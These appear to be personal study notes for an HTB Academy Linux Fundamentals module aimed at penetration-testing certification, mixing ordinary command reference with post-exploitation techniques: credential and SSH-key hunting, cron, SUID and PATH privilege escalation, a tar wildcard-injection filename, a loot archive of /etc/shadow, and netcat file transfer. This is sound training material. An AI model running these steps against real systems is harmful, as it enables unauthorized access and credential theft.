# Linux Fundamentals
**HTB Academy Module** | **CPTS Prerequisites**
**Completed:** March 2026 | **Author:** Jay Patel

## Why This Module Matters For CPTS and Beyond

Every single tool used in penetration testing runs on Linux. Nmap, Netcat,
Metasploit, Impacket, Gobuster, Hydra, Hashcat, BloodHound — all of them
live in the terminal. If you are slow in Linux you are slow everywhere. This
module is not optional background knowledge. It is the operating environment
for the entire CPTS path and for OSCP. Every lab, every machine, every shell
you catch — you will be working in Linux.

The goal of this module is not to memorise commands. It is to build fluency —
the ability to navigate, investigate, and manipulate a Linux system without
thinking about syntax. That fluency is what separates someone who reads
writeups from someone who writes them.

---

## 1. Linux File System Hierarchy

```
/           Root — everything starts here
├── bin/    Essential binaries (ls, cp, mv, cat)
├── etc/    System configuration files — always check here first
├── home/   User home directories
├── root/   Root user home directory
├── var/    Variable data — logs, web files, mail
├── tmp/    Temporary files — world-writable, important for privesc
├── proc/   Virtual filesystem — running processes and kernel info
├── dev/    Device files
├── usr/    User programs and libraries
└── opt/    Optional third-party software
```

**Pentest relevance by path:**

| Path | Why It Matters |
|---|---|
| `/etc/passwd` | All user accounts — world readable |
| `/etc/shadow` | Password hashes — root readable only |
| `/etc/crontab` | Scheduled jobs — common privesc vector |
| `/etc/cron.d/` | Additional cron job definitions |
| `/etc/ssh/sshd_config` | SSH server configuration |
| `/var/log/auth.log` | Authentication events — who logged in |
| `/var/log/syslog` | System events |
| `/var/www/html/` | Web root — config files often contain DB creds |
| `/tmp/` | World-writable — safe to drop payloads here |
| `/home/user/.ssh/` | SSH keys — private key = instant access |
| `/home/user/.bash_history` | Command history — may contain passwords |
| `/opt/` | Custom installed tools often here |
| `/proc/version` | Kernel version — check for exploits |
| `/proc/net/tcp` | Network connections at kernel level |

---

## 2. Navigation and File Operations

```bash
# Navigation
pwd                          # Where am I?
ls -la                       # List all files including hidden, with permissions
ls -la /etc/                 # List specific directory
cd /var/log                  # Change directory
cd ..                        # Go up one level
cd ~                         # Home directory
cd -                         # Previous directory

# Finding files — used constantly during enumeration
find / -name "*.conf" 2>/dev/null            # All config files
find / -type f -name "id_rsa" 2>/dev/null    # SSH private keys
find / -perm -4000 2>/dev/null               # SUID binaries — privesc
find / -writable -type d 2>/dev/null         # Writable directories
find / -user root -perm -4000 2>/dev/null    # Root-owned SUID files
find /home -name "*.txt" 2>/dev/null         # Text files in home dirs
find / -name "*.php" 2>/dev/null             # PHP files — may contain creds
which python3                                # Location of binary in PATH
locate passwd                                # Fast search using database

# File operations
cp source destination        # Copy
mv source destination        # Move or rename
rm filename                  # Delete file
rm -rf directory/            # Delete directory recursively
mkdir -p path/to/dir         # Create directory and all parents
touch filename               # Create empty file

# Reading files
cat /etc/passwd              # Print entire file
less /var/log/syslog         # Scroll through large file (q to quit)
head -n 20 file.txt          # First 20 lines
tail -n 20 file.txt          # Last 20 lines
tail -f /var/log/auth.log    # Follow log file in real time — live monitoring
strings binary_file          # Extract printable strings from binary
xxd file                     # Hex dump of file
```

---

## 3. File Permissions

```
-rwxr-xr-- 1 root www-data 1234 Jan 1 12:00 script.sh
 |||||||||||
 ||||||||||└── Other: r-- (read only)
 |||||||└───── Group: r-x (read and execute)
 ||||└──────── Owner: rwx (full access)
 |||└───────── Type: - = file, d = directory, l = symlink
```

| Permission | Octal | Meaning |
|---|---|---|
| `r` | 4 | Read |
| `w` | 2 | Write |
| `x` | 1 | Execute |
| `rw-` | 6 | Read and write |
| `rwx` | 7 | Full permissions |
| `r-x` | 5 | Read and execute |

```bash
chmod 755 script.sh      # rwxr-xr-x
chmod +x script.sh       # Add execute
chmod 600 id_rsa         # rw------- — SSH key must be 600 or SSH rejects it
chmod 644 file.txt       # rw-r--r-- — standard file
chown user:group file    # Change owner and group
chown -R www-data /var/www/  # Recursive ownership change
```

### SUID / SGID — Critical Privesc Concept

```bash
# SUID = file runs as its owner regardless of who executes it
# If owned by root — it runs as root when anyone executes it
find / -perm -4000 2>/dev/null    # Find all SUID binaries
find / -perm -2000 2>/dev/null    # Find all SGID binaries
ls -la /usr/bin/passwd
# -rwsr-xr-x — the 's' in owner execute position = SUID set

# Check GTFOBins for any SUID binary you find
# https://gtfobins.github.io/ — shows how to exploit common SUID binaries
```

---

## 4. File Editing — vim and nano

Understanding file editing is essential — adding SSH keys, modifying configs,
editing scripts on a compromised machine all require it.

### vim (used on most servers)
```bash
vim filename            # Open file

# vim has two modes:
# NORMAL mode — navigation and commands (default when you open)
# INSERT mode — actually typing text

# Switching modes
i           # Enter INSERT mode (before cursor)
a           # Enter INSERT mode (after cursor)
Esc         # Return to NORMAL mode — press this when stuck

# In NORMAL mode — navigation
h j k l     # Left, down, up, right
gg          # Go to start of file
G           # Go to end of file
:20         # Go to line 20
/pattern    # Search forward for pattern
n           # Next search result
N           # Previous search result

# In NORMAL mode — editing
dd          # Delete current line
yy          # Copy (yank) current line
p           # Paste below
u           # Undo
Ctrl+r      # Redo

# Saving and quitting
:w          # Save (write)
:q          # Quit
:wq         # Save and quit
:q!         # Quit without saving — force quit
:wq!        # Save and quit (force)

# Search and replace
:%s/old/new/g       # Replace all occurrences in file
:%s/old/new/gc      # Replace with confirmation for each
```

### nano (easier, good for quick edits)
```bash
nano filename       # Open file
# Just type — no modes
Ctrl+O              # Save (Write Out)
Ctrl+X              # Exit
Ctrl+W              # Search
Ctrl+K              # Cut line
Ctrl+U              # Paste
Ctrl+G              # Help
```

---

## 5. Text Processing

These commands are used constantly during enumeration to filter and parse output.

```bash
# grep — search for patterns
grep "root" /etc/passwd                      # Lines containing root
grep -i "password" config.php               # Case insensitive
grep -r "secret" /var/www/                  # Recursive directory search
grep -v "^#" /etc/ssh/sshd_config          # Exclude comment lines
grep -n "error" /var/log/syslog             # Show line numbers with match
grep -l "password" /etc/*.conf              # List files containing match
grep -A 3 "username" config.php            # 3 lines after match
grep -B 3 "username" config.php            # 3 lines before match
grep -m 1 -B 8 "password" output.txt       # First match with 8 lines context

# cut — extract columns
cat /etc/passwd | cut -d: -f1              # Usernames (delimiter : field 1)
cat /etc/passwd | cut -d: -f1,3,6         # Fields 1, 3, 6

# awk — column processing
awk -F: '{print $1}' /etc/passwd           # Print username field
awk -F: '$3 >= 1000 {print $1}' /etc/passwd  # Users with UID >= 1000
awk '{print $11}' /var/log/auth.log        # Extract 11th field (IP in auth log)

# sed — stream editor
sed 's/old/new/g' file.txt                 # Replace all
sed -n '10,20p' file.txt                   # Print lines 10-20
sed '/^#/d' /etc/fstab                     # Delete comment lines
sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
# -i = edit file in place (destructive — use carefully)

# sort and uniq
sort file.txt | uniq                        # Remove duplicates
sort file.txt | uniq -c | sort -rn         # Count and rank occurrences

# Combining — real enumeration power
cat /etc/passwd | cut -d: -f1 | sort
grep "Failed" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
# Ranked list of IPs attempting SSH brute force
```

---

## 6. Redirection and Pipes

```bash
command > file.txt       # Write stdout to file (overwrite)
command >> file.txt      # Append stdout to file
command 2>/dev/null      # Discard all errors — used constantly with find
command 2>&1             # Redirect stderr to stdout
command &> output.txt    # Redirect both stdout and stderr
command < file.txt       # Read input from file
command1 | command2      # Pipe output to next command

# tee — output to terminal AND file simultaneously
nmap -sV 10.10.10.1 | tee scan.txt
snmpwalk -v2c -c public 10.10.10.1 | tee snmp.txt
# Critical for long scans — see everything live and save it
```

---

## 7. Archiving and Compression

Used constantly for transferring files and extracting tool archives.

```bash
# tar — most common archive format on Linux
tar -czf archive.tar.gz directory/     # Create compressed archive
tar -xzf archive.tar.gz               # Extract compressed archive
tar -czf archive.tar.gz file1 file2   # Archive multiple files
tar -tf archive.tar.gz                 # List contents without extracting
tar -xzf archive.tar.gz -C /tmp/      # Extract to specific directory

# Flag breakdown:
# c = create, x = extract, z = gzip compression, f = filename, t = list

# gzip
gzip file.txt           # Compress — creates file.txt.gz, removes original
gunzip file.txt.gz      # Decompress
gzip -k file.txt        # Compress keeping original (-k = keep)

# zip
zip archive.zip file1 file2     # Create zip
zip -r archive.zip directory/   # Zip entire directory
unzip archive.zip               # Extract
unzip -l archive.zip            # List contents

# Practical pentest use
# Compress loot before exfiltration
tar -czf loot.tar.gz /home/user/.ssh/ /etc/passwd /etc/shadow 2>/dev/null

# Extract tool archives
tar -xzf linpeas.tar.gz -C /tmp/
```

---

## 8. Cron Jobs — Privesc Vector

Cron jobs run commands automatically on a schedule. Misconfigured cron jobs
are one of the most common Linux privilege escalation paths.

```bash
# View cron jobs
crontab -l                      # Current user's cron jobs
crontab -l -u username          # Specific user's cron jobs (as root)
cat /etc/crontab                # System-wide cron jobs
cat /etc/cron.d/*               # Additional cron job definitions
ls -la /etc/cron.*              # All cron directories
cat /var/spool/cron/crontabs/*  # All user crontabs

# Cron format — know this by memory
# MIN HOUR DOM MON DOW COMMAND
# *   *    *   *   *   /path/to/script.sh
# |   |    |   |   |
# |   |    |   |   └── Day of week (0-7, 0 and 7 = Sunday)
# |   |    |   └────── Month (1-12)
# |   |    └────────── Day of month (1-31)
# |   └─────────────── Hour (0-23)
# └─────────────────── Minute (0-59)
# * means every

# Examples
*/5 * * * * /opt/backup.sh      # Every 5 minutes
0 2 * * * /usr/bin/cleanup.sh   # Daily at 2am
0 */4 * * * /opt/monitor.sh     # Every 4 hours

# What to look for during privesc
# 1. Script owned by root but writable by your user
ls -la /opt/backup.sh
# -rwxrwxrwx root root = you can overwrite it with malicious content

# 2. Script does not use full paths — PATH injection
echo $PATH                      # Check PATH
# If cron job calls python without full path, create malicious python in writable PATH dir

# 3. Wildcard injection — script uses * in tar or similar
# cat /opt/backup.sh: tar czf backup.tar.gz /var/www/*
# Create files named --checkpoint=1 and --checkpoint-action=exec=sh shell.sh

# Monitor cron execution in real time
watch -n 1 "ls -la /tmp"       # Watch /tmp for new files
pspy64                          # Tool that shows processes without root
```

---

## 9. Services and systemd

Checking what services are running is basic enumeration on any compromised system.

```bash
# List services (systemd — modern Linux)
systemctl list-units --type=service --state=running   # Running services
systemctl status ssh                                   # Status of specific service
systemctl status apache2
systemctl is-enabled ssh                               # Starts on boot?

# Start/stop/restart (as root or sudo)
systemctl start service
systemctl stop service
systemctl restart service
systemctl enable service     # Enable on boot
systemctl disable service    # Disable on boot

# Older systems (SysV init)
service --status-all         # List all services and status
service ssh status
service apache2 start

# Check what is listening
netstat -tulpn               # All listening services with PIDs
ss -tulpn                    # Modern equivalent (faster)
# -t = TCP, -u = UDP, -l = listening, -p = show PID, -n = numeric

# Find service config files from what is running
ps aux | grep apache
# Look at the process path and find config via find
find /etc -name "apache*" 2>/dev/null
```

---

## 10. Process Management

```bash
ps aux                       # All running processes
ps aux | grep apache         # Find specific process
top                          # Real-time process monitor (q to quit)
kill PID                     # Terminate process
kill -9 PID                  # Force kill

# Background jobs
command &                    # Run in background
Ctrl+Z                       # Suspend current process
bg                           # Resume in background
fg                           # Bring to foreground
jobs                         # List background jobs
wait                         # Wait for all background jobs to finish
```

---

## 11. Networking Commands

```bash
# Interface info
ip a                         # All interfaces and IPs
ip r                         # Routing table
ss -tulpn                    # Open ports and services
netstat -antup               # All connections with PIDs

# Connectivity
ping -c 4 10.10.10.1        # Test connectivity
traceroute 10.10.10.1       # Trace network path

# DNS
dig domain.com               # Detailed DNS lookup
dig any domain.com           # All record types
dig axfr domain.com @ns1.domain.com   # Zone transfer attempt
nslookup domain.com
host domain.com

# File transfer
curl http://10.10.14.1/file.sh -o file.sh      # Download file
wget http://10.10.14.1/linpeas.sh              # Download file
python3 -m http.server 8080                    # Serve files from current directory

# Netcat
nc -lvnp 4444               # Listen for connection
nc 10.10.14.1 4444          # Connect to listener
nc -lvnp 4444 > file.txt    # Receive file
nc 10.10.14.1 4444 < file.txt  # Send file
```

---

## 12. Users, Groups and Privilege Escalation Foundation

```bash
# User information
whoami                       # Current username
id                           # UID, GID, all group memberships
sudo -l                      # What can I run as sudo — CHECK THIS FIRST
cat /etc/passwd              # All user accounts
cat /etc/group               # All groups
last                         # Login history
w                            # Who is logged in now

# Switching users
sudo -l                      # Always check this before anything else
sudo su -                    # Become root (if allowed)
su - username                # Switch to another user
sudo -u www-data /bin/bash   # Spawn shell as www-data

# Environment variables — PATH manipulation
echo $PATH                   # Current PATH
env                          # All environment variables — may contain secrets
export PATH=/tmp:$PATH       # Add /tmp to front of PATH
# If a root cron job or SUID binary calls a command without full path
# and /tmp is in PATH — create a malicious version of that command in /tmp
```

---

## 13. SSH and Remote Access

```bash
ssh user@10.10.10.1                          # Basic SSH
ssh -i id_rsa user@10.10.10.1               # With private key
ssh -p 2222 user@10.10.10.1                 # Non-standard port
chmod 600 id_rsa                             # Fix permissions (required)

# Port forwarding
ssh -L 8080:127.0.0.1:80 user@10.10.10.1   # Local forward — access remote service locally
ssh -R 4444:127.0.0.1:4444 user@10.10.10.1 # Remote forward
ssh -D 1080 user@10.10.10.1                 # Dynamic SOCKS proxy

# SCP
scp file.txt user@10.10.10.1:/tmp/          # Upload
scp user@10.10.10.1:/etc/passwd ./          # Download
scp -r directory/ user@10.10.10.1:/tmp/     # Upload directory

# SSH config file (~/.ssh/config)
Host target
    HostName 10.10.10.1
    User john
    IdentityFile ~/.ssh/id_rsa
    Port 22
# Then: ssh target
```

---

## 14. Essential Pentest One-Liners

```bash
# Spawn a full TTY after catching a reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash

# Upgrade to fully interactive TTY
# Step 1 — spawn PTY above
# Step 2:
Ctrl+Z
stty raw -echo
fg
# Step 3 (inside the shell):
export TERM=xterm
stty rows 40 columns 160    # Match your terminal size

# Find credentials in files
grep -ri "password\|passwd\|secret\|credential\|api_key" /var/www/ 2>/dev/null
grep -ri "password" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# Interesting files in home directories
cat /home/*/.bash_history 2>/dev/null
ls -la /home/*/
find /home -name "id_rsa" 2>/dev/null

# System information gathering
uname -a                     # Kernel version and architecture
cat /etc/os-release          # OS version
cat /proc/version            # Kernel build info
lscpu                        # CPU information
df -h                        # Disk usage
free -h                      # Memory usage

# Network from target perspective
ss -tulpn                    # Listening services
cat /proc/net/tcp            # TCP connections at kernel level
arp -a                       # ARP cache — other hosts on network segment
route -n                     # Routing table

# SUID and writable paths — always run these on new system
find / -perm -4000 2>/dev/null | tee /tmp/suid.txt
find / -writable -type d 2>/dev/null | tee /tmp/writable.txt
find / -perm -4000 -user root 2>/dev/null
```

---

## 15. What I Learned / What Surprised Me

The pipe and redirect concept was where things clicked for me — the idea that
you can chain arbitrary commands together and that output from one tool becomes
input to the next is what makes Linux so powerful for enumeration. A single
command chain like `grep "Failed" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn`
produces a ranked list of attacking IPs in under a second. That is the mindset
shift this module produces.

The cron job privesc path surprised me in its simplicity. The idea that a
script called by root every five minutes — but writable by your low-privilege
user — means you can replace it with a reverse shell payload and get root
access when cron executes it next. No exploit required, just file permissions.

The TTY upgrade sequence was also genuinely new. Most tutorials show catching
a reverse shell but not how to make it actually usable. The `python3 pty`
spawn followed by `stty raw -echo` and `fg` is something I will use on every
machine going forward — without it, tab completion is broken, Ctrl+C kills
your shell, and vim is unusable.

---

## Quick Reference Card

| Task | Command |
|---|---|
| Where am I? | `pwd` |
| List all files with permissions | `ls -la` |
| Find SUID binaries | `find / -perm -4000 2>/dev/null` |
| Find writable directories | `find / -writable -type d 2>/dev/null` |
| What can I run as sudo? | `sudo -l` |
| All user accounts | `cat /etc/passwd \| cut -d: -f1` |
| Open ports and services | `ss -tulpn` |
| View all cron jobs | `cat /etc/crontab && ls /etc/cron.d/` |
| Search file contents recursively | `grep -ri "password" /etc/ 2>/dev/null` |
| Upgrade to full TTY | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Save output to file and terminal | `command \| tee output.txt` |
| Kernel version | `uname -a` |
| Create compressed archive | `tar -czf archive.tar.gz directory/` |
| Extract archive | `tar -xzf archive.tar.gz` |
| Check kernel version for exploits | `uname -a && cat /proc/version` |
| Find creds in web files | `grep -ri "password" /var/www/ 2>/dev/null` |
| Monitor new files in /tmp | `watch -n 1 "ls -la /tmp"` |
| Service status | `systemctl status servicename` |
| All running services | `systemctl list-units --type=service --state=running` |
| Edit file in vim | `vim file` → `i` to insert → `Esc :wq` to save |
